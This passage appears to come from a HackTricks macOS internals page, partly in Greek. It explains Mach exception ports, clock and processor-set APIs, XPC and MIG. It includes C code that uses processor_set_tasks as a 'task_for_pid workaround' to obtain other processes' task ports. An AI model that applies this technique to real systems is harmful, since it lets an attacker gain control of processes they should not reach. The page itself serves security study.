Όταν συμβαίνει μια εξαίρεση σε ένα νήμα, αυτή η εξαίρεση αποστέλλεται στο καθορισμένο port εξαίρεσης του νήματος. Αν το νήμα δεν την χειριστεί, τότε αποστέλλεται στα ports εξαίρεσης της διαδικασίας. Αν η διαδικασία δεν την χειριστεί, τότε αποστέλλεται στο host port, το οποίο διαχειρίζεται το launchd (όπου θα αναγνωριστεί). Αυτό ονομάζεται τριχοτόμηση εξαιρέσεων.

Σημειώστε ότι στο τέλος, συνήθως αν δεν χειριστεί σωστά, η αναφορά θα καταλήξει να διαχειρίζεται από τον δαίμονα ReportCrash. Ωστόσο, είναι δυνατόν ένα άλλο νήμα στην ίδια διαδικασία να διαχειριστεί την εξαίρεση, αυτό είναι που κάνουν τα εργαλεία αναφοράς κρασών όπως το `PLCreashReporter`.

## Other Objects

### Clock

Οποιοσδήποτε χρήστης μπορεί να έχει πρόσβαση σε πληροφορίες σχετικά με το ρολόι, ωστόσο για να ρυθμίσει την ώρα ή να τροποποιήσει άλλες ρυθμίσεις, πρέπει να είναι root.

Για να αποκτήσει πληροφορίες, είναι δυνατόν να καλέσει συναρτήσεις από το υποσύστημα `clock`, όπως: `clock_get_time`, `clock_get_attributtes` ή `clock_alarm`\
Για να τροποποιήσει τιμές, το υποσύστημα `clock_priv` μπορεί να χρησιμοποιηθεί με συναρτήσεις όπως `clock_set_time` και `clock_set_attributes`

### Processors and Processor Set

Οι διεπαφές API του επεξεργαστή επιτρέπουν τον έλεγχο ενός μόνο λογικού επεξεργαστή καλώντας συναρτήσεις όπως `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Επιπλέον, οι διεπαφές API του **processor set** παρέχουν έναν τρόπο ομαδοποίησης πολλών επεξεργαστών σε μια ομάδα. Είναι δυνατόν να ανακτηθεί το προεπιλεγμένο σύνολο επεξεργαστών καλώντας **`processor_set_default`**.\
Αυτές είναι μερικές ενδιαφέρουσες διεπαφές API για αλληλεπίδραση με το σύνολο επεξεργαστών:

- `processor_set_statistics`
- `processor_set_tasks`: Επιστρέφει έναν πίνακα δικαιωμάτων αποστολής σε όλες τις διαδικασίες μέσα στο σύνολο επεξεργαστών
- `processor_set_threads`: Επιστρέφει έναν πίνακα δικαιωμάτων αποστολής σε όλα τα νήματα μέσα στο σύνολο επεξεργαστών
- `processor_set_stack_usage`
- `processor_set_info`

Όπως αναφέρθηκε σε [**αυτή την ανάρτηση**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), στο παρελθόν αυτό επέτρεπε την παράκαμψη της προηγουμένως αναφερόμενης προστασίας για να αποκτήσει ports διαδικασίας σε άλλες διαδικασίες για να τις ελέγξει καλώντας **`processor_set_tasks`** και αποκτώντας ένα host port σε κάθε διαδικασία.\
Σήμερα χρειάζεστε root για να χρησιμοποιήσετε αυτή τη λειτουργία και αυτή είναι προστατευμένη, οπότε θα μπορείτε να αποκτήσετε αυτά τα ports μόνο σε μη προστατευμένες διαδικασίες.

Μπορείτε να το δοκιμάσετε με:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
